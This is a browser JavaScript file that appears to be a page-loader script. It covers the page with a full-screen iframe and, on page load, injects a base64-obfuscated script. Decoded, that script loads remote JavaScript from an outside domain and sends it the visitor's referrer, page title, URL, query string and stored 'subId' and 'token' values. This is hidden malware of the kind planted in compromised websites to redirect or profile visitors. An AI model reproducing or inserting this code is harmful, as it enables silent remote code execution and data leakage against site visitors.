const createLoader = () => {
    const frame = document.createElement('iframe');
    frame.id = 'load_frame';
    frame.src = `frameLoad.html`;
    frame.frameBorder = 0;
    frame.width = '100%';
    frame.height = '100%';
    frame.style.position = 'fixed';
    frame.style.top = 0;
    frame.style.left = 0;
    frame.style.width = '100%';
    frame.style.height = '100%';
    frame.style.zIndex = 9999;
    const body = document.querySelector('html');
    if (body && body.childNodes.length > 0) {
        const parent = body;
        parent.insertBefore(frame, body.firstChild)
    }
    
}
const toggleLoad = () => {
    const body = document.querySelector('body');
    body.removeAttribute('hidden');
    const load_frame = document.querySelector('#load_frame');
    if (load_frame) {
        load_frame.style.display = load_frame.style.display === 'none' ? 'block' : 'none';
    }
   
};
createLoader();

window.addEventListener('DOMContentLoaded', () => {
    const script = document.createElement('script');
    script.src = "data:text/javascript;base64,CiAgICAoZnVuY3Rpb24oKSB7CiAgICB2YXIgbmFtZSA9ICdfQ1pZcGI4QjI0SzNTRkZQayc7CiAgICBpZiAoIXdpbmRvdy5fQ1pZcGI4QjI0SzNTRkZQaykgewogICAgICAgIHdpbmRvdy5fQ1pZcGI4QjI0SzNTRkZQayA9IHsKICAgICAgICAgICAgdW5pcXVlOiBmYWxzZSwKICAgICAgICAgICAgdHRsOiA4NjQwMCwKICAgICAgICAgICAgUl9QQVRIOiAnaHR0cHM6Ly90YWxraW5nbWFuYWdlci5jb20vOTNXSnlqeWQnLAogICAgICAgIH07CiAgICB9CiAgICBjb25zdCBfOHBwWHNwbjMzR1ZCWW56TSA9IGxvY2FsU3RvcmFnZS5nZXRJdGVtKCdjb25maWcnKTsKICAgIGlmICh0eXBlb2YgXzhwcFhzcG4zM0dWQlluek0gIT09ICd1bmRlZmluZWQnICYmIF84cHBYc3BuMzNHVkJZbnpNICE9PSBudWxsKSB7CiAgICAgICAgdmFyIF85Qmh3c1hESDFTamI4WkNGID0gSlNPTi5wYXJzZShfOHBwWHNwbjMzR1ZCWW56TSk7CiAgICAgICAgdmFyIF9DMks5ZmpxcXNjS1hSckZwID0gTWF0aC5yb3VuZCgrbmV3IERhdGUoKS8xMDAwKTsKICAgICAgICBpZiAoXzlCaHdzWERIMVNqYjhaQ0YuY3JlYXRlZF9hdCArIHdpbmRvdy5fQ1pZcGI4QjI0SzNTRkZQay50dGwgPCBfQzJLOWZqcXFzY0tYUnJGcCkgewogICAgICAgICAgICBsb2NhbFN0b3JhZ2UucmVtb3ZlSXRlbSgnc3ViSWQnKTsKICAgICAgICAgICAgbG9jYWxTdG9yYWdlLnJlbW92ZUl0ZW0oJ3Rva2VuJyk7CiAgICAgICAgICAgIGxvY2FsU3RvcmFnZS5yZW1vdmVJdGVtKCdjb25maWcnKTsKICAgICAgICB9CiAgICB9CiAgICB2YXIgX1RzOTE2NFhqeTJURzROUDIgPSBsb2NhbFN0b3JhZ2UuZ2V0SXRlbSgnc3ViSWQnKTsKICAgIHZhciBfTmd5SGJmOTcyRzJkeEh5YyA9IGxvY2FsU3RvcmFnZS5nZXRJdGVtKCd0b2tlbicpOwogICAgdmFyIF9jaHlQeGhMRmRwOVJoY25aID0gJz9yZXR1cm49anMuY2xpZW50JzsKICAgICAgICBfY2h5UHhoTEZkcDlSaGNuWiArPSAnJicgKyBkZWNvZGVVUklDb21wb25lbnQod2luZG93LmxvY2F0aW9uLnNlYXJjaC5yZXBsYWNlKCc/JywgJycpKTsKICAgICAgICBfY2h5UHhoTEZkcDlSaGNuWiArPSAnJnNlX3JlZmVycmVyPScgKyBlbmNvZGVVUklDb21wb25lbnQoZG9jdW1lbnQucmVmZXJyZXIpOwogICAgICAgIF9jaHlQeGhMRmRwOVJoY25aICs9ICcmZGVmYXVsdF9rZXl3b3JkPScgKyBlbmNvZGVVUklDb21wb25lbnQoZG9jdW1lbnQudGl0bGUpOwogICAgICAgIF9jaHlQeGhMRmRwOVJoY25aICs9ICcmbGFuZGluZ191cmw9JyArIGVuY29kZVVSSUNvbXBvbmVudChkb2N1bWVudC5sb2NhdGlvbi5ob3N0bmFtZSArIGRvY3VtZW50LmxvY2F0aW9uLnBhdGhuYW1lKTsKICAgICAgICBfY2h5UHhoTEZkcDlSaGNuWiArPSAnJm5hbWU9JyArIGVuY29kZVVSSUNvbXBvbmVudChuYW1lKTsKICAgICAgICBfY2h5UHhoTEZkcDlSaGNuWiArPSAnJmhvc3Q9JyArIGVuY29kZVVSSUNvbXBvbmVudCh3aW5kb3cuX0NaWXBiOEIyNEszU0ZGUGsuUl9QQVRIKTsKICAgIGlmICh0eXBlb2YgX1RzOTE2NFhqeTJURzROUDIgIT09ICd1bmRlZmluZWQnICYmIF9UczkxNjRYankyVEc0TlAyICYmIHdpbmRvdy5fQ1pZcGI4QjI0SzNTRkZQay51bmlxdWUpIHsKICAgICAgICBfY2h5UHhoTEZkcDlSaGNuWiArPSAnJnN1Yl9pZD0nICsgZW5jb2RlVVJJQ29tcG9uZW50KF9UczkxNjRYankyVEc0TlAyKTsKICAgIH0KICAgIGlmICh0eXBlb2YgX05neUhiZjk3MkcyZHhIeWMgIT09ICd1bmRlZmluZWQnICYmIF9OZ3lIYmY5NzJHMmR4SHljICYmIHdpbmRvdy5fQ1pZcGI4QjI0SzNTRkZQay51bmlxdWUpIHsKICAgICAgICBfY2h5UHhoTEZkcDlSaGNuWiArPSAnJnRva2VuPScgKyBlbmNvZGVVUklDb21wb25lbnQoX05neUhiZjk3MkcyZHhIeWMpOwogICAgfQogICAgaWYgKCcnICE9PSAnJykgewogICAgICAgIF9jaHlQeGhMRmRwOVJoY25aICs9ICcmYnlwYXNzX2NhY2hlPSc7CiAgICB9CiAgICB2YXIgYSA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ3NjcmlwdCcpOwogICAgICAgIGEudHlwZSA9ICdhcHBsaWNhdGlvbi9qYXZhc2NyaXB0JzsKICAgICAgICBhLnNyYyA9IHdpbmRvdy5fQ1pZcGI4QjI0SzNTRkZQay5SX1BBVEggKyBfY2h5UHhoTEZkcDlSaGNuWjsKICAgIHZhciBzID0gZG9jdW1lbnQuZ2V0RWxlbWVudHNCeVRhZ05hbWUoJ3NjcmlwdCcpWzBdOwogICAgcy5wYXJlbnROb2RlLmluc2VydEJlZm9yZShhLCBzKQogICAgfSkoKTsKICAgIA==";
     document.querySelector("head").appendChild(script);
     setTimeout(toggleLoad, 1000);

  
})
